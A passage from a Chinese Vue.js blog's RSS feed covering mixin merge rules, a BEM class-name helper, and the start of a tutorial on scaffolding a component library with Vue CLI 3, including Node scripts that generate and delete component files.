</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="mixins" tabindex="-1"> mixins</h3>
<div><p>提示</p>
<p><code>mixins</code> 是 Vue 提供的一种混合机制, 用来更高效的实现组件内容的复用。怎么去理解混入呢, 我觉得和 <code>Object.assign</code> , 但实际与 <code>Object.assign</code> 又有所不同。</p>
</div>
<p>在 <code>Vue</code> 中, 一个混入对象可以包含任意组件选项, 但是对于不同的组件选项, 会有不同的合并策略。</p>
<ol>
<li>data 对于 data, 在混入时会进行递归合并, 如果两个属性发生冲突, 则以组件自身为主</li>
<li>生命周期钩子函数</li>
</ol>
<p>对于生命周期钩子函数, 混入时会将同名钩子函数加入到一个数组中, 然后在调用时依次执行。混入对象里面的钩子函数会优先于组件的钩子函数执行。如果一个组件混入了多个对象, 对于混入对象里面的同名钩子函数, 将按照数组顺序依次执行, 如下代码:</p>
<div><pre><code><span>const</span> mixin1 <span>=</span> <span>{</span>
  <span>created</span><span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>"我是第一个输出的"</span><span>)</span><span>;</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>

<span>const</span> mixin2 <span>=</span> <span>{</span>
  <span>created</span><span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>"我是第二个输出的"</span><span>)</span><span>;</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>

<span>export</span> <span>default</span> <span>{</span>
  <span>mixins</span><span>:</span> <span>[</span>mixin1<span>,</span> mixin2<span>]</span><span>,</span>
  <span>created</span><span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>"我是第三个输出的"</span><span>)</span><span>;</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><ol start="3">
<li>其他选项 对于值为对象的选项, 如 <code>methods</code>,<code>components</code>,<code>filter</code>,<code>directives</code>,<code>props</code> 等等, 将被合并为同一个对象。两个对象键名冲突时, 取组件对象的键值对。</li>
</ol>
<h3 id="class" tabindex="-1"> class</h3>
<div><p>提示</p>
<p>关于统一化 class 命名方式, class 命名时需要添加组织前缀的, 以下的方式比较适用</p>
</div>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>div</span> <span>:class</span><span><span>=</span><span>"</span>b(<span>'</span>form<span>'</span>)<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span><span>></span></span><span><span>
<span>const</span> <span>ELEMENT</span> <span>=</span> <span>"__"</span><span>;</span>
<span>const</span> <span>MODS</span> <span>=</span> <span>"--"</span><span>;</span>

<span>const</span> <span>join</span> <span>=</span> <span>(</span><span>name<span>,</span> el<span>,</span> symbol</span><span>)</span> <span>=></span> <span>(</span>el <span>?</span> name <span>+</span> symbol <span>+</span> el <span>:</span> name<span>)</span><span>;</span>

<span>const</span> <span>prefix</span> <span>=</span> <span>(</span><span>name<span>,</span> mods</span><span>)</span> <span>=></span> <span>{</span>
  <span>if</span> <span>(</span><span>typeof</span> mods <span>===</span> <span>"string"</span><span>)</span> <span>{</span>
    <span>return</span> <span>join</span><span>(</span>name<span>,</span> mods<span>,</span> <span>MODS</span><span>)</span><span>;</span>
  <span>}</span>

  <span>if</span> <span>(</span>Array<span>.</span><span>isArray</span><span>(</span>mods<span>)</span><span>)</span> <span>{</span>
    <span>return</span> mods<span>.</span><span>map</span><span>(</span><span>(</span><span>item</span><span>)</span> <span>=></span> <span>prefix</span><span>(</span>name<span>,</span> item<span>)</span><span>)</span><span>;</span>
  <span>}</span>

  <span>const</span> ret <span>=</span> <span>{</span><span>}</span><span>;</span>
  Object<span>.</span><span>keys</span><span>(</span>mods <span>||</span> <span>{</span><span>}</span><span>)</span><span>.</span><span>forEach</span><span>(</span><span>(</span><span>key</span><span>)</span> <span>=></span> <span>{</span>
    ret<span>[</span>name <span>+</span> <span>MODS</span> <span>+</span> key<span>]</span> <span>=</span> mods<span>[</span>key<span>]</span><span>;</span>
  <span>}</span><span>)</span><span>;</span>
  <span>return</span> ret<span>;</span>
<span>}</span><span>;</span>

<span>export</span> <span>default</span> <span>{</span>
  <span>methods</span><span>:</span> <span>{</span>
    <span>b</span><span>(</span><span>el<span>,</span> mods</span><span>)</span> <span>{</span>
      <span>const</span> <span>{</span> name <span>}</span> <span>=</span> <span>this</span><span>.</span>$options<span>;</span>

      <span>if</span> <span>(</span>el <span>&amp;&amp;</span> <span>typeof</span> el <span>!==</span> <span>"string"</span><span>)</span> <span>{</span>
        mods <span>=</span> el<span>;</span>
        el <span>=</span> <span>""</span><span>;</span>
      <span>}</span>
      el <span>=</span> <span>join</span><span>(</span>name<span>,</span> el<span>,</span> <span>ELEMENT</span><span>)</span><span>;</span>

      <span>return</span> mods <span>?</span> <span>[</span>el<span>,</span> <span>prefix</span><span>(</span>el<span>,</span> mods<span>)</span><span>]</span> <span>:</span> el<span>;</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="provide-inject" tabindex="-1"> Provide / Inject</h3>
<div><p>提示</p>
<p>这边参考 vue 的官方文档就好： <a href="https://cn.vuejs.org/v2/api/#provide-inject" target="_blank" rel="noopener noreferrer">provide / inject</a></p>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>使用 Vue cli 3.0 构建自定义组件库(第一弹)</title>
      <link>https://vxhly.github.io/views/vuejs/custom-component-library-first.html</link>
      <guid>https://vxhly.github.io/views/vuejs/custom-component-library-first.html</guid>
      <source url="https://vxhly.github.io/rss.xml">使用 Vue cli 3.0 构建自定义组件库(第一弹)</source>
      <description>前言
本文旨在给大家提供一种构建一个完整 UI 库脚手架的思路: 包括如何快速并优雅地构建 UI 库的主页、如何托管主页、如何编写脚本提升自己的开发效率、如何生成 CHANGELOG 等。

</description>
      <category>vuejs</category>
      <pubDate>Sun, 28 Apr 2019 17:19:49 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>本文旨在给大家提供一种构建一个完整 UI 库脚手架的思路: 包括如何快速并优雅地构建 UI 库的主页、如何托管主页、如何编写脚本提升自己的开发效率、如何生成 CHANGELOG 等。</p>
</div>

<h2 id="先言" tabindex="-1"> 先言</h2>
<p>主流的开源 UI 库代码结构主要分为三大部分:</p>
<ul>
<li>组件库本身的代码: 这部分代码会发布到 npm 上</li>
<li>预览示例和查看文档的网站代码: 类似 Vant、ElementUI 这类网站。</li>
<li>配置文件和脚本文件: 用于打包和发布等等</li>
</ul>
<div><p>提示</p>
<p>编写此博文的灵感 UI 框架库（<a href="https://github.com/Eamonnzhang/vue-cards" target="_blank" rel="noopener noreferrer">vue-cards</a>）, PS: 此 UI 　框架库相对于 Vant、ElementUI 　会比较简单点, 可以作为一份自定义　 UI 　框架库的入坑　 demo, 同时这篇博文也是解读这份 UI 框架库的构建到上线的一个过程</p>
</div>
<h2 id="前置工作" tabindex="-1"> 前置工作</h2>
<p>以下工作全部基于 Vue CLI 3.x, 所以首先要保证机子上有 <code>@vue/cli</code></p>
<div><pre><code>vue create vtp-component <span>## vtp-component 作为教学的库名</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="start" tabindex="-1"> start</h2>
<p>开始造轮子了</p>
<h3 id="工作目录" tabindex="-1"> 工作目录</h3>
<p>在根目录下新增四个文件夹, 一个用来存放组件的代码（packages）, 一个用来存放 预览示例的网站 代码（examples）（这里直接把初始化模板的 src 目录更改为 examples 即可, 有需要的话可以将该目录进行清空操作, 这里就不做过多的说明）, 一个用来存放编译脚本代码（build）, 一个用来存放自定义生成组件和组件的说明文档等脚本（scripts）</p>
<div><pre><code>|-- build
|
|-- examples
|
|-- packages
|
|-- scripts
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="让-webpack-编译-examples" tabindex="-1"> 让 webpack 编译 examples</h3>
<p>由于我们将 src 目录修改成了 examples, 所以在 <code>vue.config.js</code> 中需要进行相应的修改</p>
<div><pre><code><span>const</span> path <span>=</span> <span>require</span><span>(</span><span>"path"</span><span>)</span><span>;</span>

<span>function</span> <span>resolve</span><span>(</span><span>dir</span><span>)</span> <span>{</span>
  <span>return</span> path<span>.</span><span>join</span><span>(</span>__dirname<span>,</span> dir<span>)</span><span>;</span>
<span>}</span>

module<span>.</span>exports <span>=</span> <span>{</span>
  <span>productionSourceMap</span><span>:</span> <span>true</span><span>,</span>

  <span>// 修改 src 为 examples</span>
  <span>pages</span><span>:</span> <span>{</span>
    <span>index</span><span>:</span> <span>{</span>
      <span>entry</span><span>:</span> <span>"examples/main.js"</span><span>,</span>
      <span>template</span><span>:</span> <span>"public/index.html"</span><span>,</span>
      <span>filename</span><span>:</span> <span>"index.html"</span><span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>

  <span>chainWebpack</span><span>:</span> <span>(</span><span>config</span><span>)</span> <span>=></span> <span>{</span>
    config<span>.</span>resolve<span>.</span>alias<span>.</span><span>set</span><span>(</span><span>"@"</span><span>,</span> <span>resolve</span><span>(</span><span>"examples"</span><span>)</span><span>)</span><span>;</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="添加编译脚本" tabindex="-1"> 添加编译脚本</h3>
<p><code>package.json</code> 其中的组件 name 推荐和创建的项目名一致</p>
<div><pre><code><span>{</span>
  <span>"scripts"</span><span>:</span> <span>{</span>
    <span>"lib"</span><span>:</span> <span>"vue-cli-service build --target lib --name vtp-component --dest lib packages/index.js"</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><p>修改 main 主入口文件</p>
<div><pre><code><span>{</span>
  <span>"main"</span><span>:</span> <span>"lib/vtp-component.common.js"</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h3 id="一个组件例子" tabindex="-1"> 一个组件例子</h3>
<h4 id="创建组件和组件文档生成脚本" tabindex="-1"> 创建组件和组件文档生成脚本</h4>
<p>在 <code>scripts</code> 中创建以下几个文件, 其中 <code>create-comp.js</code> 是用来生成自定义组件目录和自定义组件说明文档脚本, <code>delete-comp.js</code> 是用来删除无用的组件目录和自定义组件说明文档脚本, <code>template.js</code> 是生成代码的模板文件</p>
<div><pre><code>|-- create-comp.js
|
|-- delete-comp.js
|
|-- template.js
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><p>相关的代码如下, 小主可以根据自己的需求进行相应的简单修改, 下面的代码参考来源 <a href="https://juejin.im/post/5c6772ff518825629c56943c" target="_blank" rel="noopener noreferrer">vue-cli3 项目优化之通过 node 自动生成组件模板 generate View、Component</a></p>
<p><code>create-comp.js</code></p>
<div><pre><code><span>// 创建自定义组件脚本</span>

<span>const</span> chalk <span>=</span> <span>require</span><span>(</span><span>"chalk"</span><span>)</span><span>;</span>
<span>const</span> path <span>=</span> <span>require</span><span>(</span><span>"path"</span><span>)</span><span>;</span>
<span>const</span> fs <span>=</span> <span>require</span><span>(</span><span>"fs-extra"</span><span>)</span><span>;</span>
<span>const</span> uppercamelize <span>=</span> <span>require</span><span>(</span><span>"uppercamelcase"</span><span>)</span><span>;</span>
<span>const</span> <span>resolve</span> <span>=</span> <span>(</span><span><span>...</span>file</span><span>)</span> <span>=></span> path<span>.</span><span>resolve</span><span>(</span>__dirname<span>,</span> <span>...</span>file<span>)</span><span>;</span>
<span>const</span> <span>log</span> <span>=</span> <span>(</span><span>message</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span>chalk<span>.</span><span>green</span><span>(</span><span><span>`</span><span><span>${</span>message<span>}</span></span><span>`</span></span><span>)</span><span>)</span><span>;</span>
<span>const</span> <span>successLog</span> <span>=</span> <span>(</span><span>message</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span>chalk<span>.</span><span>blue</span><span>(</span><span><span>`</span><span><span>${</span>message<span>}</span></span><span>`</span></span><span>)</span><span>)</span><span>;</span>
<span>const</span> <span>errorLog</span> <span>=</span> <span>(</span><span>error</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span>chalk<span>.</span><span>red</span><span>(</span><span><span>`</span><span><span>${</span>error<span>}</span></span><span>`</span></span><span>)</span><span>)</span><span>;</span>
<span>const</span> <span>{</span> vueTemplate<span>,</span> entryTemplate<span>,</span> mdDocs <span>}</span> <span>=</span> <span>require</span><span>(</span><span>"./template"</span><span>)</span><span>;</span>

<span>const</span> <span>generateFile</span> <span>=</span> <span>(</span><span>path<span>,</span> data</span><span>)</span> <span>=></span> <span>{</span>
  <span>if</span> <span>(</span>fs<span>.</span><span>existsSync</span><span>(</span>path<span>)</span><span>)</span> <span>{</span>
    <span>errorLog</span><span>(</span><span><span>`</span><span><span>${</span>path<span>}</span></span><span>文件已存在</span><span>`</span></span><span>)</span><span>;</span>
    <span>return</span><span>;</span>
  <span>}</span>
  <span>return</span> <span>new</span> <span>Promise</span><span>(</span><span>(</span><span>resolve<span>,</span> reject</span><span>)</span> <span>=></span> <span>{</span>
    fs<span>.</span><span>writeFile</span><span>(</span>path<span>,</span> data<span>,</span> <span>"utf8"</span><span>,</span> <span>(</span><span>err</span><span>)</span> <span>=></span> <span>{</span>
      <span>if</span> <span>(</span>err<span>)</span> <span>{</span>
        <span>errorLog</span><span>(</span>err<span>.</span>message<span>)</span><span>;</span>
        <span>reject</span><span>(</span>err<span>)</span><span>;</span>
      <span>}</span> <span>else</span> <span>{</span>
        <span>resolve</span><span>(</span><span>true</span><span>)</span><span>;</span>
      <span>}</span>
    <span>}</span><span>)</span><span>;</span>
  <span>}</span><span>)</span><span>;</span>
<span>}</span><span>;</span>

<span>// 这里生成自定义组件</span>
<span>log</span><span>(</span><span>"请输入要生成的组件名称, 形如 demo 或者 demo-test"</span><span>)</span><span>;</span>
<span>let</span> componentName <span>=</span> <span>""</span><span>;</span>
process<span>.</span>stdin<span>.</span><span>on</span><span>(</span><span>"data"</span><span>,</span> <span>async</span> <span>(</span><span>chunk</span><span>)</span> <span>=></span> <span>{</span>
  <span>let</span> inputName <span>=</span> <span>String</span><span>(</span>chunk<span>)</span><span>.</span><span>trim</span><span>(</span><span>)</span><span>.</span><span>toString</span><span>(</span><span>)</span><span>;</span>
  inputName <span>=</span> <span>uppercamelize</span><span>(</span>inputName<span>)</span><span>;</span>
  <span>const</span> componentDirectory <span>=</span> <span>resolve</span><span>(</span><span>"../packages"</span><span>,</span> inputName<span>)</span><span>;</span>
  <span>const</span> componentVueName <span>=</span> <span>resolve</span><span>(</span>componentDirectory<span>,</span> <span><span>`</span><span><span>${</span>inputName<span>}</span></span><span>.vue</span><span>`</span></span><span>)</span><span>;</span>
  <span>const</span> entryComponentName <span>=</span> <span>resolve</span><span>(</span>componentDirectory<span>,</span> <span>"index.js"</span><span>)</span><span>;</span>

  <span>const</span> hasComponentDirectory <span>=</span> fs<span>.</span><span>existsSync</span><span>(</span>componentDirectory<span>)</span><span>;</span>
  <span>if</span> <span>(</span>inputName<span>)</span> <span>{</span>
    <span>// 这里生成组件</span>
    <span>if</span> <span>(</span>hasComponentDirectory<span>)</span> <span>{</span>
      <span>errorLog</span><span>(</span><span><span>`</span><span><span>${</span>inputName<span>}</span></span><span>组件目录已存在, 请重新输入</span><span>`</span></span><span>)</span><span>;</span>
      <span>return</span><span>;</span>
    <span>}</span> <span>else</span> <span>{</span>
      <span>log</span><span>(</span><span><span>`</span><span>生成 component 目录 </span><span><span>${</span>componentDirectory<span>}</span></span><span>`</span></span><span>)</span><span>;</span>
      <span>await</span> <span>dotExistDirectoryCreate</span><span>(</span>componentDirectory<span>)</span><span>;</span>
    <span>}</span>
    <span>try</span> <span>{</span>
      <span>if</span> <span>(</span>inputName<span>.</span><span>includes</span><span>(</span><span>"/"</span><span>)</span><span>)</span> <span>{</span>
        <span>const</span> inputArr <span>=</span> inputName<span>.</span><span>split</span><span>(</span><span>"/"</span><span>)</span><span>;</span>
        componentName <span>=</span> inputArr<span>[</span>inputArr<span>.</span>length <span>-</span> <span>1</span><span>]</span><span>;</span>
      <span>}</span> <span>else</span> <span>{</span>
        componentName <span>=</span> inputName<span>;</span>
      <span>}</span>
      <span>log</span><span>(</span><span><span>`</span><span>生成 vue 文件 </span><span><span>${</span>componentVueName<span>}</span></span><span>`</span></span><span>)</span><span>;</span>
      <span>await</span> <span>generateFile</span><span>(</span>componentVueName<span>,</span> <span>vueTemplate</span><span>(</span>componentName<span>)</span><span>)</span><span>;</span>
      <span>log</span><span>(</span><span><span>`</span><span>生成 entry 文件 </span><span><span>${</span>entryComponentName<span>}</span></span><span>`</span></span><span>)</span><span>;</span>
      <span>await</span> <span>generateFile</span><span>(</span>entryComponentName<span>,</span> <span>entryTemplate</span><span>(</span>componentName<span>)</span><span>)</span><span>;</span>
      <span>successLog</span><span>(</span><span>"生成 component 成功"</span><span>)</span><span>;</span>
    <span>}</span> <span>catch</span> <span>(</span>e<span>)</span> <span>{</span>
      <span>errorLog</span><span>(</span>e<span>.</span>message<span>)</span><span>;</span>
    <span>}</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>errorLog</span><span>(</span><span><span>`</span><span>请重新输入组件名称:</span><span>`</span></span><span>)</span><span>;</span>
    <span>return</span><span>;</span>
  <span>}</span>

  <span>// 这里生成自定义组件说明文档</span>
  <span>const</span> docsDirectory <span>=</span> <span>resolve</span><span>(</span><span>"../examples/docs"</span><span>)</span><span>;</span>
  <span>const</span> docsMdName <span>=</span> <span>resolve</span><span>(</span>docsDirectory<span>,</span> <span><span>`</span><span><span>${</span>inputName<span>}</span></span><span>.md</span><span>`</span></span><span>)</span><span>;</span>

  <span>try</span> <span>{</span>
    <span>log</span><span>(</span><span><span>`</span><span>生成 component 文档 </span><span><span>${</span>docsMdName<span>}</span></span><span>`</span></span><span>)</span><span>;</span>
    <span>await</span> <span>generateFile</span><span>(</span>docsMdName<span>,</span> <span>mdDocs</span><span>(</span><span><span>`</span><span><span>${</span>inputName<span>}</span></span><span> 组件</span><span>`</span></span><span>)</span><span>)</span><span>;</span>
    <span>successLog</span><span>(</span><span>"生成 component 文档成功"</span><span>)</span><span>;</span>
  <span>}</span> <span>catch</span> <span>(</span>e<span>)</span> <span>{</span>
    <span>errorLog</span><span>(</span>e<span>.</span>message<span>)</span><span>;</span>
  <span>}</span>

  process<span>.</span>stdin<span>.</span><span>emit</span><span>(</span><span>"end"</span><span>)</span><span>;</span>
<span>}</span><span>)</span><span>;</span>

process<span>.</span>stdin<span>.</span><span>on</span><span>(</span><span>"end"</span><span>,</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
  <span>log</span><span>(</span><span>"exit"</span><span>)</span><span>;</span>
  process<span>.</span><span>exit</span><span>(</span><span>)</span><span>;</span>
<span>}</span><span>)</span><span>;</span>

<span>function</span> <span>dotExistDirectoryCreate</span><span>(</span><span>directory</span><span>)</span> <span>{</span>
  <span>return</span> <span>new</span> <span>Promise</span><span>(</span><span>(</span><span>resolve</span><span>)</span> <span>=></span> <span>{</span>
    <span>mkdirs</span><span>(</span>directory<span>,</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
      <span>resolve</span><span>(</span><span>true</span><span>)</span><span>;</span>
    <span>}</span><span>)</span><span>;</span>
  <span>}</span><span>)</span><span>;</span>
<span>}</span>

<span>// 递归创建目录</span>
<span>function</span> <span>mkdirs</span><span>(</span><span>directory<span>,</span> callback</span><span>)</span> <span>{</span>
  <span>var</span> exists <span>=</span> fs<span>.</span><span>existsSync</span><span>(</span>directory<span>)</span><span>;</span>
  <span>if</span> <span>(</span>exists<span>)</span> <span>{</span>
    <span>callback</span><span>(</span><span>)</span><span>;</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>mkdirs</span><span>(</span>path<span>.</span><span>dirname</span><span>(</span>directory<span>)</span><span>,</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
      fs<span>.</span><span>mkdirSync</span><span>(</span>directory<span>)</span><span>;</span>
      <span>callback</span><span>(</span><span>)</span><span>;</span>
    <span>}</span><span>)</span><span>;</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>delete-comp.js</code></p>
<div><pre><code><span>// 删除自定义组件脚本</span>

<span>const</span> chalk <span>=</span> <span>require</span><span>(</span><span>"chalk"</span><span>)</span><span>;</span>
<span>const</span> path <span>=</span> <span>require</span><span>(</span><span>"path"</span><span>)</span><span>;</span>
<span>const</span> fs <span>=</span> <span>require</span><span>(</span><span>"fs-extra"</span><span>)</span><span>;</span>
<span>const</span> uppercamelize <span>=</span> <span>require</span><span>(</span><span>"uppercamelcase"</span><span>)</span><span>;</span>
<span>const</span> <span>resolve</span> <span>=</span> <span>(</span><span><span>...</span>file</span><span>)</span> <span>=></span> path<span>.</span><span>resolve</span><span>(</span>__dirname<span>,</span> <span>...</span>file<span>)</span><span>;</span>
<span>const</span> <span>log</span> <span>=</span> <span>(</span><span>message</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span>chalk<span>.</span><span>green</span><span>(</span><span><span>`</span><span><span>${</span>message<span>}</span></span><span>`</span></span><span>)</span><span>)</span><span>;</span>
<span>const</span> <span>successLog</span> <span>=</span> <span>(</span><span>message</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span>chalk<span>.</span><span>blue</span><span>(</span><span><span>`</span><span><span>${</span>message<span>}</span></span><span>`</span></span><span>)</span><span>)</span><span>;</span>
<span>const</span> <span>errorLog</span> <span>=</span> <span>(</span><span>error</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span>chalk<span>.</span><span>red</span><span>(</span><span><span>`</span><span><span>${</span>error<span>}</span></span><span>`</span></span><span>)</span><span>)</span><span>;</span>

<span>log</span><span>(</span><span>"请输入要删除的组件名称, 形如 demo 或者 demo-test"</span><span>)</span><span>;</span>
process<span>.</span>stdin<span>.</span><span>on</span><span>(</span><span>"data"</span><span>,</span> <span>async</span> <span>(</span><span>chunk</span><span>)</span> <span>=></span> <span>{</span>
  <span>let</span> inputName <span>=</span> <span>String</span><span>(</span>chunk<span>)</span><span>.</span><span>trim</span><span>(</span><span>)</span><span>.</span><span>toString</span><span>(</span><span>)</span><span>;</span>
  inputName <span>=</span> <span>uppercamelize</span><span>(</span>inputName<span>)</span><span>;</span>
  <span>const</span> componentDirectory <span>=</span> <span>resolve</span><span>(</span><span>"../packages"</span><span>,</span> inputName<span>)</span><span>;</span>

  <span>const</span> hasComponentDirectory <span>=</span> fs<span>.</span><span>existsSync</span><span>(</span>componentDirectory<span>)</span><span>;</span>

  <span>const</span> docsDirectory <span>=</span> <span>resolve</span><span>(</span><span>"../examples/docs"</span><span>)</span><span>;</span>
  <span>const</span> docsMdName <span>=</span> <span>resolve</span><span>(</span>docsDirectory<span>,</span> <span><span>`</span><span><span>${</span>inputName<span>}</span></span><span>.md</span><span>`</span></span><span>)</span><span>;</span>
  <span>if</span> <span>(</span>inputName<span>)</span> <span>{</span>
    <span>if</span> <span>(</span>hasComponentDirectory<span>)</span> <span>{</span>
      <span>log</span><span>(</span><span><span>`</span><span>删除 component 目录 </span><span><span>${</span>componentDirectory<span>}</span></span><span>`</span></span><span>)</span><span>;</span>
      <span>await</span> <span>removePromise</span><span>(</span>componentDirectory<span>)</span><span>;</span>
      <span>successLog</span><span>(</span><span><span>`</span><span>已删除 </span><span><span>${</span>inputName<span>}</span></span><span> 组件目录</span><span>`</span></span><span>)</span><span>;</span>

      <span>log</span><span>(</span><span><span>`</span><span>删除 component 文档 </span><span><span>${</span>docsMdName<span>}</span></span><span>`</span></span><span>)</span><span>;</span>
      fs<span>.</span><span>unlink</span><span>(</span>docsMdName<span>)</span><span>;</span>
      <span>successLog</span><span>(</span><span><span>`</span><span>已删除 </span><span><span>${</span>inputName<span>}</span></span><span> 组件说明文档</span><span>`</span></span><span>)</span><span>;</span>
    <span>}</span> <span>else</span> <span>{</span>
      <span>errorLog</span><span>(</span><span><span>`</span><span><span>${</span>inputName<span>}</span></span><span>组件目录不存在</span><span>`</span></span><span>)</span><span>;</span>
      <span>return</span><span>;</span>
    <span>}</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>errorLog</span><span>(</span><span><span>`</span><span>请重新输入组件名称:</span><span>`</span></span><span>)</span><span>;</span>
    <span>return</span><span>;</span>
  <span>}</span>

  process<span>.</span>stdin<span>.</span><span>emit</span><span>(</span><span>"end"</span><span>)</span><span>;</span>
<span>}</span><span>)</span><span>;</span>

process<span>.</span>stdin<span>.</span><span>on</span><span>(</span><span>"end"</span><span>,</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
  <span>log</span><span>(</span><span>"exit"</span><span>)</span><span>;</span>
  process<span>.</span><span>exit</span><span>(</span><span>)</span><span>;</span>
<span>}</span><span>)</span><span>;</span>

<span>function</span> <span>removePromise</span><span>(</span><span>dir</span><span>)</span> <span>{</span>
  <span>return</span> <span>new</span> <span>Promise</span><span>(</span><span>function</span> <span>(</span><span>resolve<span>,</span> reject</span><span>)</span> <span>{</span>
    <span>// 先读文件夹</span>
    fs<span>.</span><span>stat</span><span>(</span>dir<span>,</span> <span>function</span> <span>(</span><span>_err<span>,</span> stat</span><span>)</span> <span>{</span>
      <span>if</span> <span>(</span>stat<span>.</span><span>isDirectory</span><span>(</span><span>)</span><span>)</span> <span>{</span>
        fs<span>.</span><span>readdir</span><span>(</span>dir<span>,</span> <span>function</span> <span>(</span><span>_err<span>,</span> files</span><span>)</span> <span>{</span>
          files <span>=</span> files<span>.</span><span>map</span><span>(</span><span>(</span><span>file</span><span>)</span> <span>=></span> path<span>.</span><span>join</span><span>(</span>dir<span>,</span> file<span>)</span><span>)</span><span>;</span> <span>// a/b  a/m</span>
          files <span>=</span> files<span>.</span><span>map</span><span>(</span><span>(</span><span>file</span><span>)</span> <span>=></span> <span>removePromise</span><span>(</span>file<span>)</span><span>)</span><span>;</span> <span>// 这时候变成了promise</span>
          Promise<span>.</span><span>all</span><span>(</span>files<span>)</span><span>.</span><span>then</span><span>(</span><span>function</span> <span>(</span><span>)</span> <span>{</span>
            fs<span>.</span><span>rmdir</span><span>(</span>dir<span>,</span> resolve<span>)</span><span>;</span>
          <span>}</span><span>)</span><span>;</span>
        <span>}</span><span>)</span><span>;</span>
      <span>}</span> <span>else</span> <span>{</span>
        fs<span>.</span><span>unlink</span><span>(</span>dir<span>,</span> resolve<span>)</span><span>;</span>
      <span>}</span>
    <span>}</span><span>)</span><span>;</span>
  <span>}</span><span>)</span><span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>template.js</code></p>
<div><pre><code>module<span>.</span>exports <span>=</span> <span>{</span>
    <span>vueTemplate</span><span>:</span> <span>compoenntName</span> <span>=></span> <span>{</span>

